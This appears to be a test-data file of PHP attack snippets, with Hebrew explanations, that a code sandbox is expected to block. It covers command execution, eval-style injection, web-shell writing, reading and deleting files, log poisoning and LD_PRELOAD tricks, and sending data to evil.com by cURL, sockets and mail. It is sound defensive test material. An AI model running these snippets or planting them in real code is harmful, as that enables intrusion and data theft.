/**
 * PHP Security Attack Vectors
 * 
 * PHP is widely used for web applications and has many dangerous functions
 * that can lead to Remote Code Execution (RCE) and data theft.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const phpTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: system()',
    code: `<?php system('whoami'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודות מערכת ישירות
      
      איך האקרים משתמשים בזה:
      system() מריצה פקודת shell ומציגה את הפלט.
      זו אחת מדרכי ה-RCE הנפוצות ביותר ב-PHP.
      
      השפעה בעולם האמיתי:
      - הרצת כל פקודה עם ההרשאות של שרת ה-web
      - system('cat /etc/passwd') חושפת חשבונות משתמשים
      - system('wget evil.com/shell.php -O shell.php') מתקינה דלתות אחוריות
      
      הערה היסטורית:
      אינספור פריצות web shell מתחילות מקריאות ל-system().
      היא נמצאת בטופ 5 הפונקציות המסוכנות ביותר ב-PHP.
    `,
  },
  {
    name: 'PHP: exec()',
    code: `<?php exec('ls -la', $output); print_r($output); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודה עם לכידת פלט
      
      איך האקרים משתמשים בזה:
      exec() מריצה פקודה ושומרת את הפלט בתוך מערך.
      תוקפים משתמשים בה כדי למפות קבצים ולחלץ מידע.
      
      השפעה בעולם האמיתי:
      - לכידת פלט פקודה לצורך עיבוד נוסף
      - פלט כמערך קל יותר לפירוק וניתוח
      - סריקת תיקיות ואיתור קבצי הגדרות
    `,
  },
  {
    name: 'PHP: shell_exec()',
    code: `<?php echo shell_exec('id'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: פקודת Shell עם פלט כמחרוזת
      
      איך האקרים משתמשים בזה:
      shell_exec() מחזירה את פלט הפקודה כמחרוזת אחת.
      היא שקולה לאופרטור ה-backticks.
      
      השפעה בעולם האמיתי:
      - לכידת פלט בצורה פשוטה
      - קל להדפיס את הפלט ישירות
      - נפוצה מאוד ב-web shells
    `,
  },
  {
    name: 'PHP: passthru()',
    code: `<?php passthru('cat /etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: העברת פלט פקודה גולמי לדפדפן
      
      איך האקרים משתמשים בזה:
      passthru() מעבירה את פלט הפקודה ישירות לדפדפן.
      זה שימושי במיוחד עבור פלט בינארי או זרמי מידע גדולים.
      
      השפעה בעולם האמיתי:
      - הזרמת קבצים ישירות לתוקף
      - בלי בעיות buffering בזיכרון
      - יעיל להדלפת קבצים בינאריים
    `,
  },
  {
    name: 'PHP: popen()',
    code: `<?php $h = popen('ls', 'r'); echo fread($h, 1024); pclose($h); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: פתיחת Pipe לתהליך
      
      איך האקרים משתמשים בזה:
      popen() פותחת pipe לתהליך לצורך קריאה או כתיבה.
      היא מאפשרת תקשורת אינטראקטיבית עם פקודות.
      
      השפעה בעולם האמיתי:
      - הזרמת מידע אל תהליכים ומהם
      - תקשורת עם shell אינטראקטיבי
      - שליטה בתהליכים ארוכי-ריצה
    `,
  },
  {
    name: 'PHP: proc_open()',
    code: `<?php $proc = proc_open('id', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: שליטה מלאה בתהליך
      
      איך האקרים משתמשים בזה:
      proc_open() נותנת שליטה מלאה על קלט ופלט של תהליך.
      זו פונקציית הרצת התהליכים החזקה ביותר ב-PHP.
      
      השפעה בעולם האמיתי:
      - שליטה נפרדת ב-stdin, stdout ו-stderr
      - יצירת shells אינטראקטיביים
      - בניית צינורות תהליכים מורכבים
    `,
  },
  {
    name: 'PHP: pcntl_exec()',
    code: `<?php pcntl_exec('/bin/sh', ['-c', 'id']); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצה דרך Process Control
      
      איך האקרים משתמשים בזה:
      pcntl_exec() מחליפה את התהליך הנוכחי בתהליך חדש.
      היא חלק מהרחבת pcntl לניהול תהליכים במערכות Unix.
      
      השפעה בעולם האמיתי:
      - החלפת תהליך PHP ב-shell
      - הרצת קבצים בינאריים ישירות
      - קשה יותר לעקוב אחרי הפעולה
    `,
  },
  {
    name: 'PHP: Backtick operator',
    code: `<?php echo \`whoami\`; ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודות עם אופרטור Backtick
      
      איך האקרים משתמשים בזה:
      Backticks הם קיצור דרך ל-shell_exec().
      הם פחות בולטים מקריאה רגילה לפונקציה.
      
      השפעה בעולם האמיתי:
      - הרצת פקודות בצורה סמויה יותר
      - לעיתים מפוספס בביקורת קוד
      - שקול בפועל ל-shell_exec()
    `,
  },
  {
    name: 'PHP: expect_popen',
    code: `<?php expect_popen('spawn /bin/bash'); ?>`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: שליטה בתהליכים דרך הרחבת Expect
      
      איך האקרים משתמשים בזה:
      הרחבת expect יכולה להפעיל תהליכים אינטראקטיביים.
      היא מיועדת לאוטומציה, אבל מסוכנת מאוד בהקשר של web.
      
      השפעה בעולם האמיתי:
      - הפעלת shells אינטראקטיביים
      - אוטומציה של אינטראקציות מערכת
      - פחות נפוצה, ולכן עלולה לעקוף פילטרים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE INJECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: eval()',
    code: `<?php eval('echo "pwned";'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: הרצת קוד דינמית
      
      איך האקרים משתמשים בזה:
      eval() מריצה מחרוזת כקוד PHP.
      זו הפונקציה המסוכנת ביותר ב-PHP בהקשר של RCE.
      
      השפעה בעולם האמיתי:
      - הרצת כל קוד PHP מתוך מחרוזות
      - web shells משתמשים ב-eval($_POST['cmd'])
      - עקיפת כמעט כל פילטר קלט
      
      פריצות מוכרות:
      הרבה פריצות WordPress/Joomla משתמשות ב-eval injection
    `,
  },
  {
    name: 'PHP: assert()',
    code: `<?php assert('system("id")'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: הרצת קוד דרך assert() ב-PHP < 8
      
      איך האקרים משתמשים בזה:
      ב-PHP גרסאות לפני 8, assert() עם ארגומנט מחרוזת מריצה אותו כקוד.
      לעיתים מתעלמים ממנה כסיכון אבטחתי.
      
      השפעה בעולם האמיתי:
      - חלופה ל-eval שעשויה לעקוף פילטרים
      - עובדת בגרסאות PHP ישנות יותר
      - שם פונקציה שנראה פחות חשוד
    `,
  },
  {
    name: 'PHP: create_function()',
    code: `<?php $f = create_function('', 'system("id");'); $f(); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: יצירת פונקציה דינמית
      
      איך האקרים משתמשים בזה:
      create_function() בונה פונקציות מתוך מחרוזות, בדומה ל-eval.
      היא deprecated, אבל עדיין קיימת בסביבות רבות.
      
      השפעה בעולם האמיתי:
      - יצירה והרצה של פונקציות זדוניות
      - עקיפת חסימה של eval()
      - פונקציה אנונימית עם הזרקת קוד
    `,
  },
  {
    name: 'PHP: preg_replace /e modifier',
    code: `<?php @preg_replace('/.*/e', 'system("id")', ''); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: Eval דרך Regex Modifier
      
      איך האקרים משתמשים בזה:
      המודיפייר /e, שכבר deprecated, מעריך את ההחלפה כקוד PHP.
      זה וקטור קלאסי לפגיעויות PHP.
      
      השפעה בעולם האמיתי:
      - הרצת קוד בתוך החלפות regex
      - הרבה פריצות ישנות משתמשות בזה
      - הוסר ב-PHP 7, אבל קוד legacy עדיין קיים
    `,
  },
  {
    name: 'PHP: preg_replace_callback',
    code: `<?php preg_replace_callback('/./', function($m) { system('id'); }, 'a'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: הרצת Callback דרך Regex
      
      איך האקרים משתמשים בזה:
      preg_replace_callback() קוראת לפונקציה עבור כל התאמה.
      ה-callback יכול להכיל קוד זדוני.
      
      השפעה בעולם האמיתי:
      - הרצת קוד עבור כל התאמת regex
      - חלופה מודרנית למודיפייר /e
      - הזרקת קוד מבוססת פונקציה
    `,
  },
  {
    name: 'PHP: call_user_func',
    code: `<?php call_user_func('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: קריאה דינמית לפונקציה
      
      איך האקרים משתמשים בזה:
      call_user_func() קוראת לכל פונקציה לפי שם.
      כך ניתן לקרוא לפונקציות מסוכנות בצורה דינמית.
      
      השפעה בעולם האמיתי:
      - קריאה לכל פונקציה דרך שם כמחרוזת
      - עקיפת פילטרים שמחפשים שם פונקציה ישיר
      - call_user_func('sys'.'tem', 'id') עוקף בדיקות פשוטות
    `,
  },
  {
    name: 'PHP: call_user_func_array',
    code: `<?php call_user_func_array('system', ['id']); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: קריאה דינמית לפונקציה עם ארגומנטים ממערך
      
      איך האקרים משתמשים בזה:
      call_user_func_array() מעבירה ארגומנטים כמערך.
      זה שימושי כשמספר הארגומנטים משתנה.
      
      השפעה בעולם האמיתי:
      - אותו דפוס כמו call_user_func, אבל עם ארגומנטים במערך
      - גמיש יותר עבור payloads מורכבים
    `,
  },
  {
    name: 'PHP: array_map callback',
    code: `<?php array_map('system', ['id']); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback בפונקציות מערך
      
      איך האקרים משתמשים בזה:
      array_map() מפעילה callback על כל איבר במערך.
      שימוש ב-'system' כ-callback מריץ פקודות.
      
      השפעה בעולם האמיתי:
      - הרצת פקודות עבור כל איבר במערך
      - פחות בולט מקריאה ישירה ל-system()
      - לעיתים מפוספס בביקורות קוד
    `,
  },
  {
    name: 'PHP: array_filter callback',
    code: `<?php array_filter(['id'], 'system'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback ב-array_filter
      
      איך האקרים משתמשים בזה:
      array_filter() יכולה להשתמש ב-callback לצורך סינון.
      שימוש ב-'system' מריץ כל איבר כפקודה.
      
      השפעה בעולם האמיתי:
      - אותו דפוס כמו ניצול array_map
      - הפקודות שמופיעות במערך מורצות
      - הזרקת קוד דרך callbacks
    `,
  },
  {
    name: 'PHP: array_walk callback',
    code: `<?php $a = ['id']; array_walk($a, 'system'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback ב-array_walk
      
      איך האקרים משתמשים בזה:
      array_walk() מפעילה callback על כל איבר ומשנה את המערך במקום.
      זו עוד פונקציית מערך שניתנת לניצול להרצת קוד.
      
      השפעה בעולם האמיתי:
      - דומה ל-array_map
      - משנה את המערך במקום
      - ה-callback מקבל גם ערך וגם מפתח
    `,
  },
  {
    name: 'PHP: array_reduce callback',
    code: `<?php array_reduce(['id'], function($c, $i) { system($i); }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback ב-array_reduce
      
      איך האקרים משתמשים בזה:
      array_reduce() עם callback זדוני מריצה קוד
      בזמן שהיא נראית כמו פעולה רגילה של צמצום מערך.
      
      השפעה בעולם האמיתי:
      - הסתרת הרצה בתוך לוגיקת reduction
      - נראה כמו עיבוד נתונים רגיל
      - ה-callback מקבל פריטים ברצף
    `,
  },
  {
    name: 'PHP: usort callback',
    code: `<?php usort([''], function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback במיון
      
      איך האקרים משתמשים בזה:
      פונקציות מיון מקבלות callbacks להשוואה.
      callbacks זדוניים רצים במהלך פעולת המיון.
      
      השפעה בעולם האמיתי:
      - הרצה בזמן השוואת פריטים במיון
      - וקטור תקיפה עדין מאוד
      - נראה כמו מיון תמים
    `,
  },
  {
    name: 'PHP: uasort callback',
    code: `<?php $a=['x']; uasort($a, function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback במיון אסוציאטיבי
      
      איך האקרים משתמשים בזה:
      uasort() שומרת על קשר בין מפתחות לערכים בזמן מיון.
      אותו ניצול callback כמו ב-usort() עובד גם כאן.
      
      השפעה בעולם האמיתי:
      - זהה לתקיפות usort
      - שומר על מפתחות המערך
      - עוד וקטור תקיפה דרך פונקציות מיון
    `,
  },
  {
    name: 'PHP: uksort callback',
    code: `<?php $a=['a'=>1]; uksort($a, function($a,$b){ system('id'); return 0; }); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: ניצול Callback במיון לפי מפתחות
      
      איך האקרים משתמשים בזה:
      uksort() ממיינת לפי מפתחות בעזרת callback.
      גם כאן ניתן לנצל את ה-callback להרצת קוד.
      
      השפעה בעולם האמיתי:
      - מיון לפי מפתחות עם הרצת קוד
      - משלים את משפחת ניצולי פונקציות המיון
    `,
  },
  {
    name: 'PHP: register_shutdown_function',
    code: `<?php register_shutdown_function('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: רישום Handler לסיום הרצה
      
      איך האקרים משתמשים בזה:
      רושמים פונקציה שתרוץ כאשר PHP מסיים את הסקריפט.
      handler זדוני נשאר רשום עד סוף ההרצה.
      
      השפעה בעולם האמיתי:
      - הרצת קוד בסיום הסקריפט
      - הרצה מובטחת גם במקרה של שגיאות
      - התמדה דרך מנגנון cleanup
    `,
  },
  {
    name: 'PHP: register_tick_function',
    code: `<?php declare(ticks=1); register_tick_function('system', 'id'); ?>`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 התקפה: רישום Tick Function
      
      איך האקרים משתמשים בזה:
      פונקציות tick רצות כל N פקודות.
      הן יכולות להריץ קוד שוב ושוב בזמן הרצת הסקריפט.
      
      השפעה בעולם האמיתי:
      - הרצת קוד חוזרת
      - יכולות ניטור או יירוט
      - פחות נפוץ, ולכן עשוי לעקוף פילטרים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: file_get_contents',
    code: `<?php echo file_get_contents('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת תוכן קבצים
      
      איך האקרים משתמשים בזה:
      file_get_contents() קוראת קבצים שלמים לתוך מחרוזת.
      זו פונקציית קריאת הקבצים הנפוצה ביותר ב-PHP.
      
      השפעה בעולם האמיתי:
      - קריאת /etc/passwd למיפוי משתמשים
      - גישה לקוד המקור של האפליקציה
      - קריאת קבצי הגדרות עם סיסמאות
      - מחרוזות חיבור למסד נתונים
    `,
  },
  {
    name: 'PHP: file_put_contents',
    code: `<?php file_put_contents('/tmp/shell.php', '<?php system($_GET["c"]); ?>'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: כתיבת קבצים / יצירת Web Shell
      
      איך האקרים משתמשים בזה:
      file_put_contents() כותבת מידע לקבצים.
      זו דרך מרכזית ליצירת web shells.
      
      השפעה בעולם האמיתי:
      - יצירת PHP web shells
      - שינוי קבצי PHP קיימים
      - כתיבת מפתחות SSH להתמדה
      - יצירת cron jobs
    `,
  },
  {
    name: 'PHP: file() function',
    code: `<?php print_r(file('/etc/passwd')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת קובץ לפי שורות
      
      איך האקרים משתמשים בזה:
      file() קוראת קובץ לתוך מערך של שורות.
      כך קל יותר לעבד את תוכן הקובץ.
      
      השפעה בעולם האמיתי:
      - קריאת קבצים כמערכים
      - עיבוד שורה-אחר-שורה
      - נוח יותר לפירוק מידע מאשר file_get_contents
    `,
  },
  {
    name: 'PHP: fopen/fread',
    code: `<?php $f = fopen('/etc/passwd', 'r'); echo fread($f, 1000); fclose($f); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: פעולות קובץ ברמה נמוכה
      
      איך האקרים משתמשים בזה:
      fopen/fread מספקות גישה מדויקת יותר לקבצים.
      ניתן לקרוא חלקים מסוימים מתוך קובץ.
      
      השפעה בעולם האמיתי:
      - גישה זורמת לקבצים
      - קריאת קבצים גדולים במקטעים
      - דילוג למיקומים מסוימים בקובץ
    `,
  },
  {
    name: 'PHP: readfile()',
    code: `<?php readfile('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: פלט קובץ ישיר
      
      איך האקרים משתמשים בזה:
      readfile() מוציאה קובץ ישירות לדפדפן.
      היא יעילה לקבצים גדולים כי אין צורך ב-buffering מלא.
      
      השפעה בעולם האמיתי:
      - הזרמת קבצים לתוקף
      - בלי שמירת כל הקובץ בזיכרון
      - מתאים להדלפת מידע בינארי
    `,
  },
  {
    name: 'PHP: include',
    code: `<?php include('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: Local File Inclusion (LFI)
      
      איך האקרים משתמשים בזה:
      include() טוענת ומריצה קובץ PHP.
      עם קבצים שאינם PHP, התוכן לרוב מוצג.
      
      השפעה בעולם האמיתי:
      - הפיכת LFI ל-RCE דרך log poisoning
      - קריאת קבצים רגישים
      - הכללת קבצים מרוחקים אם האפשרות מופעלת
      - משפחת פגיעויות מרכזית
    `,
  },
  {
    name: 'PHP: include_once',
    code: `<?php include_once('/var/log/apache2/error.log'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: LFI דרך Log Poisoning
      
      איך האקרים משתמשים בזה:
      כוללים קבצי log שמכילים תוכן בשליטת התוקף.
      אם הוזרק קוד PHP ל-log, הוא ירוץ בזמן ה-include.
      
      השפעה בעולם האמיתי:
      - טכניקה קלאסית להפיכת LFI ל-RCE
      - הזרקת <?php system($_GET[c])?> דרך User-Agent
      - ואז הכללת קובץ ה-log
    `,
  },
  {
    name: 'PHP: require',
    code: `<?php require('/etc/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: הכללת קובץ חובה
      
      איך האקרים משתמשים בזה:
      require() דומה ל-include(), אבל גורמת לשגיאה קטלנית אם הקובץ חסר.
      דפוס ה-LFI זהה.
      
      השפעה בעולם האמיתי:
      - אותן תקיפות כמו include()
      - הסקריפט נעצר אם הקובץ לא נמצא
      - נפוץ עבור קבצים קריטיים
    `,
  },
  {
    name: 'PHP: scandir',
    code: `<?php print_r(scandir('/')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: מיפוי תיקיות
      
      איך האקרים משתמשים בזה:
      scandir() מציגה את תוכן התיקייה.
      זה כלי בסיסי למיפוי מערכת הקבצים.
      
      השפעה בעולם האמיתי:
      - גילוי מבנה הקבצים
      - איתור קבצי הגדרות וגיבויים
      - זיהוי תיקיות שניתן לכתוב אליהן
    `,
  },
  {
    name: 'PHP: glob',
    code: `<?php print_r(glob('/etc/*')); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: גילוי קבצים לפי תבנית
      
      איך האקרים משתמשים בזה:
      glob() מוצאת קבצים לפי patterns.
      היא חזקה במיוחד לאיתור סוגי קבצים מסוימים.
      
      השפעה בעולם האמיתי:
      - מציאת כל קבצי .php: glob('*.php')
      - מציאת הגדרות: glob('/etc/*.conf')
      - חיפוש לפי תבניות
    `,
  },
  {
    name: 'PHP: show_source',
    code: `<?php show_source('/var/www/html/config.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: חשיפת קוד מקור
      
      איך האקרים משתמשים בזה:
      show_source() מציגה קבצי PHP עם syntax highlighting.
      כך נחשף קוד המקור של האפליקציה.
      
      השפעה בעולם האמיתי:
      - קריאת קוד PHP
      - איתור סיסמאות hardcoded
      - גילוי דפוסי פגיעות
      - הבנת הלוגיקה של האפליקציה
    `,
  },
  {
    name: 'PHP: highlight_file',
    code: `<?php highlight_file('/var/www/html/wp-config.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: חשיפת קוד מקור עם הדגשת תחביר
      
      איך האקרים משתמשים בזה:
      highlight_file() היא alias של show_source().
      היא נפוצה במיוחד בניסיונות לחשוף קבצי הגדרות של WordPress.
      
      השפעה בעולם האמיתי:
      - סיסמאות מסד נתונים של WordPress
      - הצגה כ-HTML מעוצב
      - API keys וסודות נוספים
    `,
  },
  {
    name: 'PHP: move_uploaded_file',
    code: `<?php move_uploaded_file('/tmp/upload', '/var/www/shell.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: עקיפת העלאת קבצים
      
      איך האקרים משתמשים בזה:
      move_uploaded_file() מעבירה קבצים שהועלו לשרת.
      ניתן לנצל אותה כדי להציב web shells.
      
      השפעה בעולם האמיתי:
      - העברת shell שהועלה לתיקיית web
      - עקיפת בדיקות העלאה
      - ניצול קלאסי של פגיעויות upload
    `,
  },
  {
    name: 'PHP: copy',
    code: `<?php copy('/etc/passwd', '/var/www/html/passwd.txt'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: העתקת קבצים
      
      איך האקרים משתמשים בזה:
      copy() משכפלת קבצים למיקומים חדשים.
      כך ניתן להעביר קבצים רגישים למיקום נגיש.
      
      השפעה בעולם האמיתי:
      - העתקת קבצים רגישים ל-web root
      - הפיכת קבצים פרטיים לנגישים ציבורית
      - שכפול לצורך הדלפה
    `,
  },
  {
    name: 'PHP: unlink',
    code: `<?php unlink('/var/www/html/index.php'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: מחיקת קבצים
      
      איך האקרים משתמשים בזה:
      unlink() מוחקת קבצים.
      זו פעולה הרסנית או דרך להסרת ראיות.
      
      השפעה בעולם האמיתי:
      - מחיקת קבצי אפליקציה
      - הסרת logs כדי לטשטש עקבות
      - מניעת שירות באמצעות מחיקה
    `,
  },
  {
    name: 'PHP: symlink',
    code: `<?php symlink('/etc/passwd', '/var/www/html/passwd'); ?>`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: תקיפת Symlink
      
      איך האקרים משתמשים בזה:
      symlink() יוצרת קישורים סימבוליים.
      ניתן לקשר קבצים רגישים למיקומים נגישים.
      
      השפעה בעולם האמיתי:
      - חשיפת /etc/passwd דרך שרת ה-web
      - עקיפת מגבלות תיקייה
      - פגיעות symlink קלאסית
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: fsockopen',
    code: `<?php $fp = fsockopen('evil.com', 80); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: חיבור Socket גולמי
      
      איך האקרים משתמשים בזה:
      fsockopen() יוצרת חיבורי רשת.
      היא משמשת ל-reverse shells ולהדלפת מידע.
      
      השפעה בעולם האמיתי:
      - חיבורי reverse shell
      - בקשות HTTP לשרתי C2
      - סריקת פורטים
      - תקיפות SSRF
    `,
  },
  {
    name: 'PHP: pfsockopen',
    code: `<?php $fp = pfsockopen('evil.com', 4444); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: חיבור Socket מתמשך
      
      איך האקרים משתמשים בזה:
      pfsockopen() יוצרת חיבורים מתמשכים.
      הם נשמרים בין בקשות לצורך יעילות.
      
      השפעה בעולם האמיתי:
      - חיבורים ארוכי-חיים לתוקפים
      - תקשורת חוזרת יעילה
      - Connection pooling לצורכי תקיפה
    `,
  },
  {
    name: 'PHP: curl_exec',
    code: `<?php $ch = curl_init('https://evil.com/collect'); curl_exec($ch); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: בקשות HTTP דרך cURL
      
      איך האקרים משתמשים בזה:
      cURL הוא כלי חזק לבקשות HTTP.
      ניתן להשתמש בו להדלפת מידע או להורדת payloads.
      
      השפעה בעולם האמיתי:
      - שליחת מידע גנוב לתוקף
      - הורדת malware
      - תקיפות SSRF
      - פעולות HTTP מורכבות
    `,
  },
  {
    name: 'PHP: stream_socket_client',
    code: `<?php $fp = stream_socket_client('tcp://evil.com:4444'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: Stream Socket Client
      
      איך האקרים משתמשים בזה:
      stream_socket_client() הוא API מודרני ל-sockets.
      הוא תומך ב-TCP, UDP ו-Unix sockets.
      
      השפעה בעולם האמיתי:
      - חלופה ל-fsockopen
      - יותר אפשרויות פרוטוקול
      - חיבורי נתונים בזרימה
    `,
  },
  {
    name: 'PHP: stream_socket_server',
    code: `<?php $server = stream_socket_server('tcp://0.0.0.0:9999'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: יצירת שרת Socket
      
      איך האקרים משתמשים בזה:
      הפונקציה יוצרת שרת socket שמאזין לחיבורים.
      הוא יכול לקבל חיבורים נכנסים.
      
      השפעה בעולם האמיתי:
      - יצירת backdoor מאזין
      - bind shell לגישה מרחוק
      - נקודות pivot ברשת הפנימית
    `,
  },
  {
    name: 'PHP: ftp_connect',
    code: `<?php $ftp = ftp_connect('evil.com'); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: חיבור FTP
      
      איך האקרים משתמשים בזה:
      פונקציות FTP מאפשרות העברת קבצים.
      ניתן להדליף קבצים או להוריד malware.
      
      השפעה בעולם האמיתי:
      - העלאת קבצים גנובים
      - הורדת כלים נוספים
      - פרוטוקול ישן שעשוי לעקוף ניטור
    `,
  },
  {
    name: 'PHP: mail()',
    code: `<?php mail('attacker@evil.com', 'Data', file_get_contents('/etc/passwd')); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: הדלפת מידע באימייל
      
      איך האקרים משתמשים בזה:
      mail() שולחת אימיילים, כולל מידע גנוב.
      ניתן להשתמש בה גם לשליחת ספאם.
      
      השפעה בעולם האמיתי:
      - שליחת קבצים רגישים באימייל
      - תקיפות header injection
      - ניצול כ-spam relay
    `,
  },
  {
    name: 'PHP: stream_get_contents URL',
    code: `<?php echo stream_get_contents(fopen('https://evil.com', 'r')); ?>`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: שליפת URL דרך Streams
      
      איך האקרים משתמשים בזה:
      Streams יכולים לפתוח URLs כאילו היו קבצים.
      זו חלופה ל-cURL או file_get_contents.
      
      השפעה בעולם האמיתי:
      - הורדת תוכן מרוחק
      - תקיפות SSRF
      - עלול לעקוף פילטרים לפונקציות URL
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SUPERGLOBAL ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'PHP: $_ENV access',
    code: `<?php print_r($_ENV); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: גישה למשתני סביבה
      
      איך האקרים משתמשים בזה:
      $_ENV מכיל משתני סביבה שעלולים לכלול
      הגדרות רגישות.
      
      השפעה בעולם האמיתי:
      - קריאת API keys
      - סיסמאות למסדי נתונים
      - טוקנים לשירותי ענן
      - סודות אפליקטיביים
    `,
  },
  {
    name: 'PHP: $_SERVER access',
    code: `<?php print_r($_SERVER); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: חשיפת מידע שרת
      
      איך האקרים משתמשים בזה:
      $_SERVER מכיל מידע על השרת ועל הבקשה.
      זה שימושי למודיעין מקדים.
      
      השפעה בעולם האמיתי:
      - חשיפת נתיבי שרת
      - מיקום document root
      - גרסת תוכנת השרת
      - HTTP headers
    `,
  },
  {
    name: 'PHP: getenv()',
    code: `<?php echo getenv('PATH'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: קריאת משתני סביבה
      
      איך האקרים משתמשים בזה:
      getenv() קוראת משתני סביבה ספציפיים.
      היא מאפשרת גישה ממוקדת לסודות ידועים.
      
      השפעה בעולם האמיתי:
      - קריאת credentials ספציפיים
      - בדיקה של סביבת הרצה מסוימת
      - איסוף מידע ממוקד
    `,
  },
  {
    name: 'PHP: putenv()',
    code: `<?php putenv('LD_PRELOAD=/tmp/evil.so'); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: שינוי משתני סביבה
      
      איך האקרים משתמשים בזה:
      putenv() משנה משתני סביבה.
      זה יכול לאפשר ניצול של פגיעויות אחרות.
      
      השפעה בעולם האמיתי:
      - LD_PRELOAD injection לצורך RCE
      - שינוי PATH לצורך command hijacking
      - שינוי התנהגות האפליקציה
    `,
  },
  {
    name: 'PHP: apache_getenv',
    code: `<?php print_r(apache_getenv('PATH')); ?>`,
    expectBlocked: true,
    category: 'superglobal_access',
    explanation: `
      🎯 התקפה: גישה לסביבת Apache
      
      איך האקרים משתמשים בזה:
      גישה ספציפית למשתני סביבה של Apache.
      הם עשויים להכיל מידע נוסף על השרת.
      
      השפעה בעולם האמיתי:
      - משתנים ייחודיים ל-Apache
      - מידע מודיעיני נוסף
